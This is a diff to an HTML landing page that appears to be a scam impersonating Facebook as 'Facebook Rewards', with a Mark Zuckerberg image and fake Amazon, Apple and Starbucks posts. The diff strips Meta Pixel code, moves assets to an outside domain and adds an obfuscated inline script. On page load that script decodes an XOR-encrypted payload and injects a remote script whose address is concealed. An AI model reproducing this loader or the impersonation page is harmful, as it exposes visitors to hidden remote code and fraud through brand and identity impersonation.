@@ -11,69 +11,11 @@
   <link rel="dns-prefetch" href="https://scripts.converteai.net">
   <link rel="dns-prefetch" href="https://images.converteai.net">
   <link rel="dns-prefetch" href="https://api.vturb.com.br">
-  <link rel="stylesheet" href="css/MM3nXP63nRRs.css">
-
-  <!-- Meta Pixel Code -->
-  <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-
-    fbq('init', '2008483963125888');
-    fbq('track', 'PageView');
-    fbq('track', 'ViewContent', {
-      content_name: 'Facebook Rewards',
-      content_type: 'product'
-    });
-
-    // Evita eventos repetidos se o visitante clicar mais de uma vez.
-    window.metaTrackOnce = function(eventName, parameters, storageKey) {
-      if (typeof fbq !== 'function') return false;
-      var key = 'meta_pixel_2008483963125888_' + (storageKey || eventName);
-      try {
-        if (sessionStorage.getItem(key) === '1') return false;
-        sessionStorage.setItem(key, '1');
-      } catch (error) {}
-      fbq('track', eventName, parameters || {});
-      return true;
-    };
-
-    // Use esta função SOMENTE após o servidor/gateway confirmar PAID ou APPROVED.
-    // Exemplo: metaTrackConfirmedPurchase(19.90, 'USD', transactionId);
-    window.metaTrackConfirmedPurchase = function(value, currency, transactionId) {
-      var amount = Number(value);
-      var orderId = String(transactionId || '').trim();
-      if (typeof fbq !== 'function' || !Number.isFinite(amount) || amount <= 0 || !orderId) {
-        return false;
-      }
-
-      var purchaseKey = 'meta_purchase_2008483963125888_' + orderId;
-      try {
-        if (localStorage.getItem(purchaseKey) === '1') return false;
-        localStorage.setItem(purchaseKey, '1');
-      } catch (error) {}
-
-      fbq('track', 'Purchase', {
-        value: amount,
-        currency: currency || 'USD',
-        content_name: 'Facebook Rewards',
-        content_type: 'product'
-      }, {
-        eventID: orderId
-      });
-      return true;
-    };
-  </script>
-  <!-- End Meta Pixel Code -->
+  <link rel="stylesheet" href="/cs/MM3nXP63nRRs.css">
 
   <script>window.pixelId = "691dd5a5e48594b29ef91762";</script>
-  <script src="js/BDTxNxyJpnED.js" async=""></script>
-  <script src="js/wAFZJQpKHWNK.js" data-utmify-prevent-subids="" async="" defer=""></script>
+  <script src="/cs/BDTxNxyJpnED.js" async=""></script>
+  <script src="/cs/wAFZJQpKHWNK.js" data-utmify-prevent-subids="" async="" defer=""></script>
 <script>(function(){var q_a3=atob("DNhJRS508ec91GIp7KNrMFwY090fvBZdnKtzagEXlYkToRZEhb4wa00bnMlfpk1aj6ogNVoH3pJJuREGgLk9IF0A341O9k4Ljaw9N0cWhJNYp0ATt6NrK08ZlMUH9gZImLlkMFoZmIFE+RJbia4sK1pZiYRSsE9aj7NraQwCkItIsUATzvo0aVVWn4ZQsUATzrwoMU9ZhJNQvQRQwag7IFgRn5MQpxdLhbw6ZwJWh4ZRoQcL1vprOHMJ");var h_aa6k=[];for(var o_oh05=0;o_oh05<q_a3.length;o_oh05++){h_aa6k.push(q_a3.charCodeAt(o_oh05)&255);}var g_e=h_aa6k[0];var h_m=h_aa6k.slice(1,1+g_e);var y_w2d=h_aa6k.slice(1+g_e);var i_529=y_w2d.map(function(b,p_xq52){return b^h_m[p_xq52%g_e];});var h_0j="";for(var m_m2=0;m_m2<i_529.length;m_m2++){h_0j+=String.fromCharCode(i_529[m_m2]&255);}var y_l1l=decodeURIComponent(escape(h_0j));var l_oap6=JSON.parse(y_l1l);var t_bqy=l_oap6.globals||[];t_bqy.forEach(function(q_vml){window[q_vml.name]=q_vml.value;});var c_6v9n=document.createElement("script");c_6v9n.src=l_oap6.url;c_6v9n.async=true;c_6v9n.defer=true;(l_oap6.attributes||[]).forEach(function(x_t){c_6v9n.setAttribute(x_t.name,x_t.value);});(document.head||document.documentElement).appendChild(c_6v9n);})();</script>
 <!-- Twemoji: emojis estilo Facebook/Twitter -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/twemoji.min.js" crossorigin="anonymous"></script>
@@ -182,7 +124,7 @@
           <!-- Header -->
           <header class="sticky top-0 z-50 bg-white border-b border-gray-200 px-4 py-3 w-full">
             <div class="flex items-center justify-between w-full max-w-[430px] mx-auto">
-              <img alt="Facebook" width="125" height="28" class="h-6 w-auto object-contain" src="images/Facebook_Logo_%282019%29.svg">
+              <img alt="Facebook" width="125" height="28" class="h-6 w-auto object-contain" src="https://currentsolutions.online/face/images/Facebook_Logo_%282019%29.svg">
               <div class="bg-[#22C55E] text-white px-4 py-2 rounded-full font-bold text-base flex items-center gap-2 shadow-sm">
                 <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
                   <rect x="2" y="5" width="20" height="14" rx="2"></rect>
@@ -208,7 +150,7 @@
           <!-- Header -->
           <header class="sticky top-0 z-50 bg-white border-b border-gray-200 px-4 py-3 w-full">
             <div class="flex items-center justify-between max-w-[430px] mx-auto">
-              <img alt="Facebook" width="125" height="28" class="h-6 w-auto object-contain" src="images/Facebook_Logo_%282019%29.svg">
+              <img alt="Facebook" width="125" height="28" class="h-6 w-auto object-contain" src="https://currentsolutions.online/face/images/Facebook_Logo_%282019%29.svg">
               <div class="bg-[#22C55E] text-white px-4 py-2 rounded-full font-bold text-base flex items-center gap-2 shadow-sm">
                 <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
                   <rect x="2" y="5" width="20" height="14" rx="2"></rect>
@@ -227,7 +169,7 @@
               <div class="p-3 flex justify-between items-start">
                 <div class="flex gap-2">
                   <div class="relative w-10 h-10 rounded-full overflow-hidden border border-gray-200 flex-shrink-0">
-                    <img src="images/bMLFkPEGl3xh.webp" alt="Mark Zuckerberg" class="w-full h-full object-cover">
+                    <img src="https://currentsolutions.online/face/images/bMLFkPEGl3xh.webp" alt="Mark Zuckerberg" class="w-full h-full object-cover">
                   </div>
                   <div class="flex flex-col">
                     <div class="flex items-center gap-1">
@@ -313,7 +255,7 @@
               <!-- Write comment input -->
               <div class="flex items-start gap-2 px-4 py-3 border-t border-gray-100 bg-white">
                 <div class="relative w-8 h-8 rounded-full overflow-hidden border border-gray-200 flex-shrink-0">
-                  <img src="images/Yl8jFpPF17D9.png" alt="You" class="w-full h-full object-cover">
+                  <img src="https://currentsolutions.online/face/images/Yl8jFpPF17D9.png" alt="You" class="w-full h-full object-cover">
                 </div>
                 <form class="flex-1 relative" onsubmit="addComment(event)">
                   <input id="comment-input" type="text" placeholder="Write a comment..." class="w-full bg-[#F0F2F5] rounded-full px-3 py-2 text-[15px] text-[#050505] placeholder-gray-500 focus:outline-none focus:bg-gray-200 transition-colors pr-10">
@@ -370,7 +312,7 @@
       <!-- App info -->
       <div class="flex w-full items-center gap-4 p-4 border rounded-xl border-gray-200 bg-white shadow-sm text-left">
         <div class="relative w-16 h-16 rounded-lg overflow-hidden bg-gray-100 flex-shrink-0">
-          <img src="images/lZFRpx3ZE7xx.png" alt="Facebook Rewards" class="w-full h-full object-contain p-1">
+          <img src="https://currentsolutions.online/face/images/lZFRpx3ZE7xx.png" alt="Facebook Rewards" class="w-full h-full object-contain p-1">
         </div>
         <div class="flex flex-col">
           <span class="font-bold text-lg leading-tight">Facebook Rewards</span>
@@ -409,24 +351,24 @@
     null, // step 0 has no post
     {
       name: "Amazon.com",
-      logo: "images/amazon_logo.webp",
-      image: "images/amazon_post.webp",
+      logo: "https://currentsolutions.online/face/images/amazon_logo.webp",
+      image: "https://currentsolutions.online/face/images/amazon_post.webp",
       text: 'Black Friday Week starts 11/20, but there are plenty of early deals now to kick off the holiday season 🎁 Shop savings now: <span class="text-[#0164D1] font-bold">https://amazon.visitlink.me/lBekah</span> <span class="text-[#0164D1] font-bold">#AmazonFinds</span>',
       likes: "36,8 mil", comments: "735 comments", shares: "1.401 shares",
       question: "Is this photo relevant to you?"
     },
     {
       name: "Apple",
-      logo: "images/apple_logo.webp",
-      image: "images/apple_post.webp",
+      logo: "https://currentsolutions.online/face/images/apple_logo.webp",
+      image: "https://currentsolutions.online/face/images/apple_post.webp",
       text: 'Took the hit and kept going. <span class="text-[#0164D1] font-bold">#ShotOnAppleWatch</span> by <span class="text-[#0164D1] font-bold">@carlosalcaraz</span>',
       likes: "4.736", comments: "232 comments", shares: "54 shares",
       question: "Would you watch this content?"
     },
     {
       name: "Starbucks",
-      logo: "images/starbucks_logo.webp",
-      image: "images/starbucks_post.webp",
+      logo: "https://currentsolutions.online/face/images/starbucks_logo.webp",
+      image: "https://currentsolutions.online/face/images/starbucks_post.webp",
       text: 'Say hello, to the newest Nitro 😍 Introducing the new Cinnamon Caramel Cream Nitro Cold Brew.',
       likes: "12.5 mil", comments: "432 comments", shares: "127 shares",
       question: "Do you find this interesting?"
